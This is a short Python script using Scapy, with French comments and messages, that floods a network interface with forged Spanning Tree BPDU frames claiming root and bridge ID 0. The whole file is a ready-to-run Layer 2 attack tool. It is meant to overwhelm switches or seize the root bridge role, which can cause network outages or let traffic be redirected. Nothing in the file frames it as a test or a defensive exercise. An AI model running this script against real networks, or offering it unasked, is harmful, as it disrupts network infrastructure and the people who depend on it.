from scapy.all import *
import time

def send_bpdu_flood(interface, count=10000, delay=0.01):
    try:
        mac_src = get_if_hwaddr(interface)
    except Exception as e:
        print(f"Erreur lors de la récupération de l'adresse MAC pour {interface} : {e}")
        return

    bpdu_packet = Ether(dst="01:80:C2:00:00:00", src=mac_src) / \
                  LLC(dsap=0x42, ssap=0x42, ctrl=0x03) / \
                  STP(rootid=0, bridgeid=0)

    print(f"Envoi de {count} trames BPDU sur {interface} avec MAC {mac_src}...")

    for _ in range(count):
        sendp(bpdu_packet, iface=interface, verbose=False)
        time.sleep(delay)  # On évite de tout envoyer d'un coup

    print("Envoi terminé.")

if __name__ == "__main__":
    interface = "eth0"  # Modifie ici si besoin
    send_bpdu_flood(interface)
